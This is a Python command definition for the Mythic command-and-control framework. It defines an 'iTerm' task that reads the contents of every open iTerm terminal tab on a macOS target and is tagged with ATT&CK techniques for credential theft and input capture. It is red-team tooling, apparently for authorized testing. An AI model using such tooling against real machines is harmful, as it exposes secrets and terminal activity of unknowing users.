from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class ITermArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ITermCommand(CommandBase):
    cmd = "iTerm"
    needs_admin = False
    help_cmd = "iTerm"
    description = "Read the contents of all open iTerm tabs if iTerms is open, otherwise just inform the operator that it's not currently running"
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1552.003", "T1552", "T1056", "T1559"]
    argument_class = ITermArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="Target Application of iTerm",
            artifact_type="AppleEvent Sent",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass
